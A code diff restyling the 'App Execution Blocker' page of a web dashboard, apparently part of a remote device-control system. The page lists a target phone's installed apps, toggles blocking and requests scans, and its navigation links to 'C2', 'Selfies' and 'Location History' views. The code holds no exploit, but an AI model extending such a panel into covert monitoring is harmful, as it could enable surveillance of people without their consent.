@@ -5,196 +5,252 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Anasio | App Blocker</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+    <style>
+        .spinning { animation: spin .8s linear infinite; display: inline-block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .app-card { animation: fadeIn .15s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: none; } }
+        .toggle-knob { transition: left .2s; }
+    </style>
 </head>
 <body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
     <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
-        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
-            <div class="flex items-center gap-4">
-                <div class="bg-purple-600 text-white p-2 rounded-lg">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+
+        <!-- Nav -->
+        <nav class="mb-6 flex flex-wrap justify-between items-center bg-white px-5 py-4 rounded-2xl border border-gray-200 gap-4">
+            <div class="flex items-center gap-3">
+                <div class="bg-purple-50 text-purple-600 p-2.5 rounded-xl">
+                    <i class="ti ti-lock text-xl"></i>
                 </div>
-                <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">App Execution Blocker</h1></div>
+                <div>
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest">Application Management</p>
+                    <h1 class="text-xl font-semibold text-gray-900 leading-tight">App Execution Blocker</h1>
+                </div>
             </div>
-            <div class="flex flex-wrap justify-center items-center gap-4">
-                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
-                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
-                <a href="/errors_view" class="text-xs font-bold text-red-500 hover:text-red-700 transition tracking-wide uppercase">Diagnostics</a>
-                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
-                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
-                    <option value="">Loading...</option>
+            <div class="flex flex-wrap items-center gap-1.5">
+                <a href="/" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-cpu text-sm"></i> C2
+                </a>
+                <a href="/selfies_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-camera text-sm"></i> Selfies
+                </a>
+                <a href="/errors_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-alert-circle text-sm"></i> Diag
+                </a>
+                <a href="/history_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
+                    <i class="ti ti-history text-sm"></i> History
+                </a>
+                <div class="w-px h-5 bg-gray-200 mx-1"></div>
+                <select id="device-select" aria-label="Select device"
+                    class="bg-white text-gray-800 font-medium text-sm border border-gray-200 rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-purple-400 cursor-pointer hover:border-purple-300 transition appearance-none pr-7">
+                    <option value="">Loading…</option>
                 </select>
             </div>
         </nav>
 
-        <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-            <div class="flex items-center justify-between mb-6">
-                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Installed Applications</p>
-                <button type="button" id="refresh-apps-btn" class="text-xs font-semibold px-4 py-2 rounded-xl bg-purple-100 text-purple-700 hover:bg-purple-200 transition">Request Device Scan</button>
+        <!-- Main card -->
+        <div class="bg-white rounded-2xl border border-gray-200 p-5">
+            <!-- Header -->
+            <div class="flex items-center justify-between mb-4">
+                <div class="flex items-center gap-2 text-xs font-semibold text-gray-400 uppercase tracking-widest">
+                    <i class="ti ti-apps"></i> Installed Applications
+                </div>
+                <button id="scan-btn" type="button"
+                    class="flex items-center gap-2 text-xs font-medium bg-purple-50 text-purple-700 hover:bg-purple-100 border border-transparent px-3.5 py-1.5 rounded-lg transition disabled:opacity-50">
+                    <i id="scan-icon" class="ti ti-scan text-sm"></i> Request Device Scan
+                </button>
             </div>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Installed</p>
-                    <p id="apps-installed-count" class="text-3xl font-black text-gray-900">0</p>
+
+            <!-- Stats -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-5">
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-device-mobile text-xs"></i> Installed
+                    </p>
+                    <p id="stat-installed" class="text-2xl font-semibold text-purple-700">—</p>
                 </div>
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Blocked</p>
-                    <p id="apps-blocked-count" class="text-3xl font-black text-gray-900">0</p>
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-ban text-xs"></i> Blocked
+                    </p>
+                    <p id="stat-blocked" class="text-2xl font-semibold text-red-600">—</p>
                 </div>
-                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Device Status</p>
-                    <p id="apps-device-status" class="text-lg font-bold text-gray-900">Checking...</p>
+                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
+                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
+                        <i class="ti ti-wifi text-xs"></i> Device Status
+                    </p>
+                    <div id="stat-status">
+                        <span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full">
+                            <span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking
+                        </span>
+                    </div>
                 </div>
             </div>
-            <div id="apps-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                <div class="col-span-full text-center text-gray-400 py-8">Waiting for data...</div>
+
+            <!-- App grid -->
+            <div id="apps-container" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
+                <div class="col-span-full flex flex-col items-center justify-center py-12 gap-2 text-gray-400">
+                    <i class="ti ti-loader-2 text-3xl spinning"></i>
+                    <p class="text-sm">Loading applications…</p>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
         const selectEl = document.getElementById('device-select');
-        const appsInstalledCount = document.getElementById('apps-installed-count');
-        const appsBlockedCount = document.getElementById('apps-blocked-count');
-        const appsDeviceStatus = document.getElementById('apps-device-status');
+        const statInstalled = document.getElementById('stat-installed');
+        const statBlocked = document.getElementById('stat-blocked');
+        const statStatus = document.getElementById('stat-status');
+        const appsContainer = document.getElementById('apps-container');
+        const scanBtn = document.getElementById('scan-btn');
+        const scanIcon = document.getElementById('scan-icon');
         let currentInstalled = [];
         let currentBlocked = [];
 
-        async function fetchAvailableDevices() {
+        function escapeHtml(str) {
+            return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+        }
+
+        function setStatus(state) {
+            const map = {
+                online:   `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-green-100 text-green-700 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Online</span>`,
+                offline:  `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-red-100 text-red-600 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Offline</span>`,
+                checking: `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking</span>`,
+            };
+            statStatus.innerHTML = map[state] || map.checking;
+        }
+
+        function buildAppCard(app, isBlocked) {
+            const card = document.createElement('div');
+            card.className = `app-card flex items-center justify-between gap-3 p-3 rounded-xl border cursor-pointer transition-all ${
+                isBlocked ? 'bg-red-50 border-red-200 hover:bg-red-100' : 'bg-white border-gray-200 hover:border-gray-300 hover:bg-gray-50'
+            }`;
+            card.setAttribute('role', 'button');
+            card.setAttribute('aria-pressed', isBlocked ? 'true' : 'false');
+            card.setAttribute('aria-label', `${app} — ${isBlocked ? 'blocked, click to allow' : 'allowed, click to block'}`);
+            card.innerHTML = `
+                <div class="overflow-hidden flex-1">
+                    <div class="text-sm font-medium truncate ${isBlocked ? 'text-red-800' : 'text-gray-800'}">${escapeHtml(app)}</div>
+                    <div class="text-[10px] uppercase font-semibold tracking-wider mt-0.5 ${isBlocked ? 'text-red-500' : 'text-gray-400'}">${isBlocked ? 'Blocked' : 'Allowed'}</div>
+                </div>
+                <div class="flex-shrink-0 w-9 h-5 rounded-full relative ${isBlocked ? 'bg-red-500' : 'bg-gray-300'} transition-colors">
+                    <div class="toggle-knob w-3.5 h-3.5 rounded-full bg-white absolute top-[3px] ${isBlocked ? 'left-[19px]' : 'left-[3px]'}"></div>
+                </div>`;
+            card.addEventListener('click', () => toggleBlock(app, !isBlocked));
+            return card;
+        }
+
+        function sectionDivider(label, icon, colorClass) {
+            const div = document.createElement('div');
+            div.className = `col-span-full flex items-center gap-2 text-xs font-semibold uppercase tracking-wider pt-3 pb-1 border-t border-gray-100 mt-1 ${colorClass}`;
+            div.innerHTML = `<i class="ti ${icon} text-sm"></i>${label}`;
+            return div;
+        }
+
+        function renderApps() {
+            appsContainer.innerHTML = '';
+            const allPkgs = new Set([...currentInstalled, ...currentBlocked]);
+            if (!allPkgs.size) {
+                appsContainer.innerHTML = `<div class="col-span-full flex flex-col items-center justify-center py-12 gap-2 text-gray-400">
+                    <i class="ti ti-scan text-3xl"></i><p class="text-sm">No app list available — request a device scan</p></div>`;
+                return;
+            }
+            const blockedOnly = currentBlocked.filter(a => !currentInstalled.includes(a)).sort();
+            if (blockedOnly.length) {
+                appsContainer.appendChild(sectionDivider('Blocked (not in last scan)', 'ti-ban', 'text-red-500'));
+                blockedOnly.forEach(app => appsContainer.appendChild(buildAppCard(app, true)));
+            }
+            const blocked = currentInstalled.filter(a => currentBlocked.includes(a)).sort();
+            const allowed = currentInstalled.filter(a => !currentBlocked.includes(a)).sort();
+            if (blocked.length) {
+                appsContainer.appendChild(sectionDivider('Blocked', 'ti-ban', 'text-red-500'));
+                blocked.forEach(app => appsContainer.appendChild(buildAppCard(app, true)));
+            }
+            if (allowed.length) {
+                appsContainer.appendChild(sectionDivider('Allowed', 'ti-circle-check', 'text-gray-400'));
+                allowed.forEach(app => appsContainer.appendChild(buildAppCard(app, false)));
+            }
+        }
+
+        async function fetchDevices() {
             try {
                 const res = await fetch('/devices');
                 if (!res.ok) return;
                 const data = await res.json();
                 const devices = data.devices || [];
-                const previous = selectEl.value;
+                const prev = selectEl.value;
                 selectEl.innerHTML = '';
-                if (devices.length === 0) {
-                    selectEl.innerHTML = '<option value="">No devices</option>';
-                    return;
-                }
-                devices.forEach(did => {
+                if (!devices.length) { selectEl.innerHTML = '<option value="">No devices</option>'; return; }
+                devices.forEach(d => {
                     const opt = document.createElement('option');
-                    opt.value = did; opt.textContent = did;
-                    selectEl.appendChild(opt);
+                    opt.value = d; opt.textContent = d; selectEl.appendChild(opt);
                 });
-                selectEl.value = devices.includes(previous) ? previous : devices[0];
-            } catch(err) { console.error(err); }
-        }
-
-        async function fetchApps() {
-            if(!selectEl.value) return;
-            try {
-                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
-                if(res.ok) {
-                    const data = await res.json();
-                    
-                    const installedRaw = (data.installed_apps || "").trim();
-                    const blockedRaw = (data.blocked_apps || "").trim();
-                    
-                    const installedList = installedRaw ? installedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
-                    const blockedList = blockedRaw ? blockedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
-                    appsInstalledCount.textContent = installedList.length;
-                    appsBlockedCount.textContent = blockedList.length;
-                    appsDeviceStatus.textContent = data.is_online ? 'Online' : 'Offline';
-                    
-                    // Only re-render if data actually changed
-                    if(JSON.stringify(installedList) !== JSON.stringify(currentInstalled) || 
-                       JSON.stringify(blockedList) !== JSON.stringify(currentBlocked)) {
-                        
-                        currentInstalled = installedList;
-                        currentBlocked = blockedList;
-                        renderApps();
-                    }
-                }
+                selectEl.value = devices.includes(prev) ? prev : devices[0];
             } catch(e) { console.error(e); }
         }
 
-        function renderApps() {
-            const container = document.getElementById('apps-container');
-            container.innerHTML = '';
-            
-            if (currentInstalled.length === 0) {
-                container.innerHTML = '<div class="col-span-full text-center text-gray-400 py-8">No app list available from device. Click Request Device Scan.</div>';
-                return;
-            }
-            
-            currentInstalled.sort().forEach(app => {
-                const isBlocked = currentBlocked.includes(app);
-                
-                const card = document.createElement('div');
-                card.className = `flex items-center justify-between p-4 rounded-xl border transition cursor-pointer ${isBlocked ? 'bg-red-50 border-red-200' : 'bg-gray-50 border-gray-200 hover:border-gray-300'}`;
-                
-                card.innerHTML = `
-                    <div class="flex flex-col overflow-hidden">
-                        <span class="text-sm font-semibold truncate ${isBlocked ? 'text-red-700' : 'text-gray-800'}">${app}</span>
-                        <span class="text-[10px] uppercase font-bold tracking-widest ${isBlocked ? 'text-red-500' : 'text-gray-400'}">${isBlocked ? 'BLOCKED' : 'ALLOWED'}</span>
-                    </div>
-                    <div class="ml-4 flex-shrink-0">
-                        <div class="w-10 h-6 rounded-full relative transition-colors ${isBlocked ? 'bg-red-500' : 'bg-gray-300'}">
-                            <div class="w-4 h-4 rounded-full bg-white absolute top-1 transition-transform ${isBlocked ? 'left-5' : 'left-1'}"></div>
-                        </div>
-                    </div>
-                `;
-                
-                card.addEventListener('click', () => toggleBlock(app, !isBlocked));
-                container.appendChild(card);
-            });
+        async function fetchApps() {
+            if (!selectEl.value) return;
+            try {
+                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                const installed = (data.installed_apps || '').trim()
+                    ? data.installed_apps.split(',').map(a => a.trim()).filter(Boolean) : [];
+                const blocked = (data.blocked_apps || '').trim()
+                    ? data.blocked_apps.split(',').map(a => a.trim()).filter(Boolean) : [];
+                statInstalled.textContent = installed.length;
+                statBlocked.textContent = blocked.length;
+                setStatus(data.is_online ? 'online' : 'offline');
+                if (JSON.stringify(installed) !== JSON.stringify(currentInstalled) ||
+                    JSON.stringify(blocked) !== JSON.stringify(currentBlocked)) {
+                    currentInstalled = installed;
+                    currentBlocked = blocked;
+                    renderApps();
+                }
+            } catch(e) { setStatus('offline'); console.error(e); }
         }
 
         async function toggleBlock(app, block) {
-            let newBlocked = [...currentBlocked];
-            if (block && !newBlocked.includes(app)) {
-                newBlocked.push(app);
-            } else if (!block && newBlocked.includes(app)) {
-                newBlocked = newBlocked.filter(a => a !== app);
-            }
-            
-            // Optimistic UI update
-            currentBlocked = newBlocked;
+            let nb = [...currentBlocked];
+            if (block && !nb.includes(app)) nb.push(app);
+            else if (!block) nb = nb.filter(a => a !== app);
+            currentBlocked = nb;
+            statBlocked.textContent = nb.length;
             renderApps();
-            
-            // Send to server
-            if(!selectEl.value) return;
-            const payload = {
-                device_id: selectEl.value,
-                apps: newBlocked.join(",")
-            };
+            if (!selectEl.value) return;
             try {
                 await fetch('/set_blocked_apps', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ device_id: selectEl.value, apps: nb.join(',') })
                 });
-            } catch(e) {
-                console.error("Failed to update blocked apps", e);
-            }
+            } catch(e) { console.error('Failed to update blocked apps', e); }
         }
 
-        async function requestDeviceScan() {
-            if(!selectEl.value) { alert('No device selected'); return; }
-            const btn = document.getElementById('refresh-apps-btn');
-            btn.textContent = "Requesting...";
-            btn.disabled = true;
-            
+        async function requestScan() {
+            if (!selectEl.value) { alert('No device selected'); return; }
+            scanBtn.disabled = true;
+            scanIcon.className = 'ti ti-loader-2 text-sm spinning';
             const fd = new FormData();
             fd.append('device_id', selectEl.value);
-            try {
-                await fetch('/request_installed_apps', { method: 'POST', body: fd });
-            } catch(e) {}
-            
+            try { await fetch('/request_installed_apps', { method: 'POST', body: fd }); } catch(e) {}
             setTimeout(() => {
-                btn.textContent = "Request Device Scan";
-                btn.disabled = false;
+                scanBtn.disabled = false;
+                scanIcon.className = 'ti ti-scan text-sm';
                 fetchApps();
             }, 3000);
         }
 
-        document.getElementById('refresh-apps-btn').addEventListener('click', requestDeviceScan);
+        scanBtn.addEventListener('click', requestScan);
         selectEl.addEventListener('change', fetchApps);
-        
-        (async () => { 
-            await fetchAvailableDevices(); 
-            fetchApps(); 
-            setInterval(() => { if (document.visibilityState === 'visible') fetchApps(); }, 15000); 
+
+        (async () => {
+            await fetchDevices();
+            await fetchApps();
+            setInterval(() => { if (document.visibilityState === 'visible') fetchApps(); }, 15000);
         })();
     </script>
 </body>
